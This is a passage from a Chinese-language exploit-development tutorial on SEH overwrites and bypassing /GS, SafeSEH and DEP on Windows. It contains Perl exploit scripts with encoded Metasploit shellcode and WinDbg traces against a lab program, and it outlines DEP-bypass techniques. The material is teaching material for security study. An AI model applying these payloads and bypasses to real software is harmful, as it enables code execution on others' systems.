cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246
00270b0b ff5530 call dword ptr [ebp+30h] ss:0023:0012f93c=0012fee0
0:000>
eax=00000000 ebx=00000000 ecx=00270b0b edx=7c828786 esi=00000000 edi=00000000
eip=0012fee0 esp=0012f8e8 ebp=0012f90c iopl=0 nv up ei pl zr na pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246
0012fee0 cc int 3
查看eip指向的内存（查看前面的windbg输出）,我们注意到我们可以很容易的引用到“junk”中的内容，
尽管我们不能覆盖SEH后边的内存（因为它包含NULL字节），但我们依然可以完成一个有效的exploit，
虽然对shellcode的空间多少有点限制（500字节左右）… 但应该能工作。
因此，如果我们用nops+shellcode+junk替换那些A，我们就可以跳转到那些nop中，因此就得到了控制
权，利用实例：（使用int 3作为shellcode）:
my $size=508;
my $nops = "\x90" x 24;
my $shellcode="\xcc\xcc";
$junk=$nops.$shellcode;
$junk=$junk."\x90" x ($size-length($nops.$shellcode));
$junk=$junk."\xeb\x1a\x90\x90"; #nseh, jump 26 bytes
$junk=$junk.pack('V',0x00270b0b);
print "Payload length : " . length($junk)."\n";
system("\"C:\\Program Files\\Debugging Tools for Windows (x86)\\windbg\" seh
\"$junk\"\r\n");
Symbol search path is: SRV*C:\windbg symbols*http://msdl.microsoft.com/download/symbols
Executable search path is:
ModLoad: 00400000 00406000 seh.exe
ModLoad: 7c800000 7c8c2000 ntdll.dll
ModLoad: 77e40000 77f42000 C:\WINDOWS\system32\kernel32.dll
ModLoad: 78520000 785c3000 C:\WINDOWS\WinSxS\x86_...4148_x-ww_D495AC4E\MSVCR90.dll
(6f8.9ac): Break instruction exception - code 80000003 (first chance)
eax=78600000 ebx=7ffd9000 ecx=00000005 edx=00000020 esi=7c8897f4 edi=00151f38
eip=7c81a3e1 esp=0012fb70 ebp=0012fcb4 iopl=0 nv up ei pl nz na po nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202
ntdll!DbgBreakPoint:
7c81a3e1 cc int 3
0:000> g
(6f8.9ac): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=0012fd90 ebx=00000000 ecx=0012fd90 edx=00130000 esi=00000001 edi=004033a8
eip=004010cb esp=0012fcb4 ebp=0012feec iopl=0 nv up ei ng nz na pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010286
seh!GetInput+0xcb:
004010cb 8802 mov byte ptr [edx],al ds:0023:00130000=41
0:000> !exchain
0012fee0: 00270b0b
Invalid exception stack at 90901aeb
0:000> g
(6f8.9ac): Break instruction exception - code 80000003 (first chance)
eax=00000000 ebx=00000000 ecx=00270b0b edx=7c828786 esi=00000000 edi=00000000
eip=0012ff14 esp=0012f8e8 ebp=0012f90c iopl=0 nv up ei pl zr na pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246
0012ff14 cc int 3
0:000> d eip
0012ff14 cc cc 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................
0012ff24 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................
0012ff34 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................
0012ff44 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................
0012ff54 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................
0012ff64 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................
0012ff74 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................
0012ff84 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................
（也就是说，只要跳过那些中间不相关的数据就可以利用成功）。
现在我们使用2个向后的跳转来完成这个利用：
- 在nseh上放置向后的跳转指令（跳转7字节），它将被布置在buffer尾部的异常处理器之前。
- 向后跳转400字节（-400（十进制）= fffffe70（16进制）），在放置shellcode位置的前边布置25
字节的nop（否则shellcode不会正确执行）。
- 我们把shellcode放在用于覆盖异常处理结构的指令地址之前。
my $size=508; #before SE structure is hit
my $nops = "\x90" x 25; #25 needed to align shellcode
# windows/exec - 144 bytes
# http://www.metasploit.com
# Encoder: x86/shikata_ga_nai
# EXITFUNC=seh, CMD=calc
my $shellcode="\xd9\xcb\x31\xc9\xbf\x46\xb7\x8b\x7c\xd9\x74\x24\xf4\xb1" .
"\x1e\x5b\x31\x7b\x18\x03\x7b\x18\x83\xc3\x42\x55\x7e\x80" .
"\xa2\xdd\x81\x79\x32\x55\xc4\x45\xb9\x15\xc2\xcd\xbc\x0a" .
"\x47\x62\xa6\x5f\x07\x5d\xd7\xb4\xf1\x16\xe3\xc1\x03\xc7" .
"\x3a\x16\x9a\xbb\xb8\x56\xe9\xc4\x01\x9c\x1f\xca\x43\xca" .
"\xd4\xf7\x17\x29\x11\x7d\x72\xba\x46\x59\x7d\x56\x1e\x2a" .
"\x71\xe3\x54\x73\x95\xf2\x81\x07\xb9\x7f\x54\xf3\x48\x23" .
"\x73\x07\x89\x83\x4a\xf1\x6d\x6a\xc9\x76\x2b\xa2\x9a\xc9" .
"\xbf\x49\xec\xd5\x12\xc6\x65\xee\xe5\x21\xf6\x2e\x9f\x81" .
"\x91\x5e\xd5\x26\x3d\xf7\x71\xd8\x4b\x09\xd6\xda\xab\x75" .
"\xb9\x48\x57\x7a";
$junk=$nops.$shellcode;
$junk=$junk."\x90" x ($size-length($nops.$shellcode)-5); #5 bytes = length of jmpcode
$junk=$junk."\xe9\x70\xfe\xff\xff"; #jump back 400 bytes
$junk=$junk."\xeb\xf9\xff\xff"; #jump back 7 bytes (nseh)
$junk=$junk.pack('V',0x00270b0b); #seh
print "Payload length : " . length($junk)."\n";
system("seh \"$junk\"\r\n");
启用/GS/Safeseh重新生成执行文件（两种保护同时启用），并再次尝试攻击。
你会发现exploit失败了，但仅仅是因为异常处理结构的偏移变化了（由于加入了security_cookie域），
如果修改偏移，并稍微移动shellcode,这个exploit将又可以成功利用了(Windows 2003 Server R2 SP2
英文正式版, 启用编译选项/GS 和/Safeseh, 禁用DEP)。
my $size=516; #new offset to deal with GS
my $nops = "\x90" x 200; #moved shellcode a little bit
# windows/exec - 144 bytes
# http://www.metasploit.com
# Encoder: x86/shikata_ga_nai
# EXITFUNC=seh, CMD=calc
my $shellcode="\xd9\xcb\x31\xc9\xbf\x46\xb7\x8b\x7c\xd9\x74\x24\xf4\xb1" .
"\x1e\x5b\x31\x7b\x18\x03\x7b\x18\x83\xc3\x42\x55\x7e\x80" .
"\xa2\xdd\x81\x79\x32\x55\xc4\x45\xb9\x15\xc2\xcd\xbc\x0a" .
"\x47\x62\xa6\x5f\x07\x5d\xd7\xb4\xf1\x16\xe3\xc1\x03\xc7" .
"\x3a\x16\x9a\xbb\xb8\x56\xe9\xc4\x01\x9c\x1f\xca\x43\xca" .
"\xd4\xf7\x17\x29\x11\x7d\x72\xba\x46\x59\x7d\x56\x1e\x2a" .
"\x71\xe3\x54\x73\x95\xf2\x81\x07\xb9\x7f\x54\xf3\x48\x23" .
"\x73\x07\x89\x83\x4a\xf1\x6d\x6a\xc9\x76\x2b\xa2\x9a\xc9" .
"\xbf\x49\xec\xd5\x12\xc6\x65\xee\xe5\x21\xf6\x2e\x9f\x81" .
"\x91\x5e\xd5\x26\x3d\xf7\x71\xd8\x4b\x09\xd6\xda\xab\x75" .
"\xb9\x48\x57\x7a";
$junk=$nops.$shellcode;
$junk=$junk."\x90" x ($size-length($nops.$shellcode)-5);
$junk=$junk."\xe9\x70\xfe\xff\xff"; #jump back 400 bytes
$junk=$junk."\xeb\xf9\xff\xff"; #jump back 7 bytes
$junk=$junk.pack('V',0x00270b0b);
print "Payload length : " . length($junk)."\n";
system("seh \"$junk\"\r\n");
DEP
到目前为止的所有示例中，我们都是把shellcode放在栈中，然后让程序跳到其中去执行，硬件DEP（或
数据执行保护）就是针对性的保护措施，它把需要保护的页面置成非可执行页（总是把堆栈设置成非可执
行属性），从而达到防止shellcode在堆栈中执行的目的。
维基百科上说：DEP有两种模式，如果CPU支持内存页NX属性， 就是硬件支持的DEP。如果CPU不支持，
那就是软件支持的DEP模式，这种DEP不能阻止在数据页上执行代码，但可以防止其他的 exploit（SEH 覆
盖）
Windows XP Service Pack 2 ,Windows XP Tablet PC Edition 2005, Windows Server 2003 Service
Pack 1 and later, Windows Vista, and Windows Server 2008和所有新版本的系统都支持DEP。
换句话说:软件DEP就是safeseh！软件 DEP和NX/XD标志无关！（在 Microsoft KB article和 Uninformed
可以获取到更多关于DEP的信息）
当处理器/系统支持 NX/XD，Windows才拥有硬件DEP，如果处理器不支持 NX/XD，那么系统只有safeseh
保护（启用时），而不具有硬件DEP。
Windows中的DEP tabsheet 会表明是否支持硬件DEP。
当处理器/系统不支持NX/XD，Windows DEP等于软件DEP，Windows DEP tabsheet会是这样的：
两大处理器厂商都实现了非可执行的页面保护技术：
- AMD开发了支持非可执行保护的处理器。
- Intel也开发出了支持执行屏蔽标志的处理器，理解下边这些很重要：根据OS / SP版本的不同，DEP
对软件的保护行为是不同的。在Windows的早期版本，以及客户端版本，只为windows核心进程启用
了DEP, 此设置已在新版本中改变。在Windows服务器操作系统上，除了那些手动添加到排除列表中
的进程外，系统为其他所有进程都开启了DEP保护，客户端操作系统使用可选择启用的方式是很容易
理解的，因为他们需要能够运行各种软件，而有的软件可能和DEP不兼容。在服务器上，在部署到服
务器前都经过了严格的测试（如果确实是不兼容，他们仍然可以把它们放到排除名单中）。在Windows
2003 server SP1上DEP默认设置是OptOut。这意味着，除了排除列表上的进程外，所有进程都受到DEP
保护，在Windows XP SP2和Vista 系统上，DEP的默认设置是OptIn（DEP仅应用于核心的系统可执
行文件）。
除了optin 和 optout，影响DEP的还有两个启动选项：
- AlwaysOn：表示对所有进程启用DEP的保护，没有例外。在这种模式下，DEP不可以被关闭。
- AlwaysOff :表示对所有进程都禁用DEP，这种模式下，DEP也不能被动态开启，在64位的系统上，DEP
总是开启，不可以被关闭，记住：IE依然是32位的程序。
NX/XD 位
在支持NX标志的CPU上启用硬件DEP时,64位内核本身就支持DEP，而32位系统会自动引导到PAE模式
来支持DEP,Vista通过把只有数据存在的内存标记出来，支持NX/XD的处理器就可以知道他们是不可执行
的数据，这对阻止溢出攻击是有益的。在 Vista系统上,进程是否启用了 DEP，可以通过windows任务管
理器来看到。
关于NX保护概念非常简单，如果硬件支持NX,并且BIOS被配置成启用NX，操作系统也支持的话，至少系
统服务可以得到保护，根据不同的设置，应用程序也可以得到保护，编译器Visual Studio C提供了一个
链接标志（/ NXCOMPAT），也可以使程序启用DEP的保护。
当运行前边编写的exploit程序来在启用硬件DEP的windows2003 Server(R2, SP2, 正式版)系统上进行
攻击,这些 exploit 将不会成功（地址 0×00270b0b/0×00280b0b 以‘check if this is a valid
handler’失败而告终，这是软件DEP的杰作，有的因为执行堆栈中的代码而失败（这是硬件DEP的效果））
如果你把漏洞程序seh.exe放到排除列表里，exploit又成功了,因此证明了DEP是有效的。
绕过硬件DEP
截至今日，已经出现了一些众所周知的绕过DEP保护的技术：
rrrreeeetttt2222lllliiiibbbbcccc((((nnnnoooosssshhhheeeellllllllccccooooddddeeee))))
这种技术大体是这样的：不直接跳转到shellcode去执行，而是去执行库中的代码，被执行的代码也就可
以看做是你的恶意代码。可以在库中找到一段执行系统命令的代码，用这段库代码的地址覆盖返回地址，
因此即使NX/XD禁止在堆栈上执行代码，但库中的代码依然是可以执行的，我们可以利用这点，很显然，
这种技术对执行的代码有很大的限制，但如果不在乎这些的话，它还算是成功的，你可以阅读关于这种技
术 的 更 多 信 息 ： http://www.infosecwriters.com/text_resources/pdf/return-to-libc.pdf
http://securitytube.net/Buffer-Overflow-Primer-Part-8-(Return-to-Libc-Theory)-video.aspx。
ZZZZwwwwPPPPrrrrooootttteeeeccccttttVVVViiiirrrrttttuuuuaaaallllMMMMeeeemmmmoooorrrryyyy
这是另外一种可以绕过DEP的技术，更多的信息在这里：http://woct-blog.blogspot.com/2005/01/dep-
evasion-technique.html.
这种技术基于ret2libc技术，实际上它将多个ret2libc综合起来从而达到修改内存属性的目的，在这种
情况下栈是这样设置的，当一个函数返回的时候，程序会调用函数 VirtualProtect，需要设置的一个参
数就是VirtualProtect的返回地址，如果你把类似jmp esp指令的地址设置成VirtualProtect的返回地
址，当VirtualProtect返回后，esp应当正好指向你的shellcode，因此shellcode就可以获得执行了，
其他的参数是shellcode（需要设置成可执行的内存（如栈））的地址,shellcode的大小，等等…不幸的
是，要让执行流到达VirtualProtect需要用到NULL（当操作字符串缓冲区/ascii payload的时候，这是
致命的），关于这种技术就讨论到这里。
关闭进程的DDDDEEEEPPPP((((NNNNttttSSSSeeeettttIIIInnnnffffoooorrrrmmmmaaaattttiiiioooonnnnPPPPrrrroooocccceeeessssssss))))
因为DEP可以设置不同的模式，操作系统需要能动态关闭DEP，因此系统肯定有例程/API来启用或关闭NX，
如果黑客可以找到这个NTDLL中的API，就能绕过硬件DEP保护。
一个进程的 DEP 设置标志保存在内核结构中（ KPROCESS 结构），这个标志可以 用函数
NtQueryInformationProcess 和 NtSetInformationProcess通过设置 ProcessExecuteFlags类来查询和
修改，用内核调试器也可以达到同样的目的。
启用DEP，并通过调试器运行seh.exe，KPROCESS结构如下（省去了不相关的）：
0:000> dt nt!_KPROCESS -r
ntdll!_KPROCESS
. . .
+0x06b Flags : _KEXECUTE_OPTIONS
+0x000 ExecuteDisable : Pos 0, 1 Bit
+0x000 ExecuteEnable : Pos 1, 1 Bit
+0x000 DisableThunkEmulation : Pos 2, 1 Bit